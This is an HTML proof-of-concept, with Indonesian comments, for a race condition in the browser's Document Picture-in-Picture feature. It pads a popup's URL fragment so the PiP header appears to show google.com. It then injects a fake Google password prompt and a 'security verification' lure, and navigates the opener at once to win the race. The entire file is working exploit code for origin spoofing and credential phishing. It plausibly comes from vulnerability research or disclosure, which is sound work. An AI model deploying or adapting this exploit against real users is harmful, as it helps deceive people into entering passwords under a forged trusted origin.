<!DOCTYPE html>
<html lang="en">
<head>
    <title>Doc-PiP Race Condition PoC</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
    <script>
        let step = 0;

        document.addEventListener('DOMContentLoaded', () => {
            document.body.addEventListener('click', async () => {
                step++;

                if (step === 1) {
                    // Langkah 1: buka popup about:blank, muat payload spoofing di fragment
                    const padding = '/'.repeat(300);
                    const spoofedUrl = 'https://www.google.com/';
                    const popup = window.open('about:blank#' + padding + spoofedUrl, 'poc', 'width=400,height=400');

                    if (!popup) {
                        document.body.innerHTML = '<h1 style="color:orange;">Popup diblokir</h1>';
                        return;
                    }

                    // Tulis tombol tipuan ke dalam popup
                    popup.document.body.innerHTML = `
                        <h1 style="color:#333;">Verifikasi Keamanan</h1>
                        <button id="pipBtn" style="padding:20px;font-size:18px;">Konfirmasi</button>
                    `;

                    // Langkah 2: klik tombol, picu PiP, SEGERA navigasi (race condition)
                    popup.document.getElementById('pipBtn').addEventListener('click', async () => {
                        try {
                            // Buka jendela Document PiP
                            const pipWin = await documentPictureInPicture.requestWindow({
                                width: 220,
                                height: 300
                            });

                            // Tulis formulir phishing ke dalam PiP
                            pipWin.document.body.innerHTML = `
                                <h2 style="color:red;">Google</h2>
                                <p>Verifikasi akun</p>
                                <input type="password" placeholder="Kata sandi" style="width:100%;">
                            `;

                            // ==== Inti race condition ====
                            // Segera navigasi opener, memanfaatkan jendela waktu observer belum terdaftar (100-500ms)
                            // Header PiP akan menampilkan google.com (dari payload), bukan URL sebenarnya
                            window.location.href = 'https://www.google.com';
                            // ============================

                        } catch (e) {
                            popup.document.body.innerHTML = 
                                `<h1 style="color:gray;">PiP gagal: ${e.message}</h1>`;
                        }
                    });
                }
            });
        });
    </script>
</head>
<body style="margin:0;padding:0;">
    <br><br><br>
    <center>
        <h1>Ketuk di mana saja untuk memulai</h1>
        <p style="color:#666;">Klik 1: buka popup · Klik 2: picu PiP + race condition</p>
    </center>
</body>
</html>
